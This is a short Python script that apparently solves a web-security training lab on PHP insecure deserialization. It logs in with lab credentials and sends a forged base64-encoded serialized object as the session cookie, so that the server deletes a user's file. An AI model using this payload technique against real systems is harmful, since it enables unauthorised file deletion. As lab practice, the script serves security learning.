import requests
import base64

url = "https://acb91fcd1eff4ea3c03c6109002200da.web-security-academy.net"


def encode_bs4(e):

	sample_string_bytes = e.encode("ascii")  
	base64_bytes = base64.b64encode(sample_string_bytes)
	base64_string = base64_bytes.decode("ascii")

	return base64_string

def slove(url):

	s = requests.session()

	data = {"username": "wiener", "password": "peter"}
	r1 = s.post(url+ "/login", data=data)
	
	d = 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}'
	payload = encode_bs4(d)

	exploit = s.get(url + "/my-account", cookies={'session': payload})

	print(exploit)

slove(url)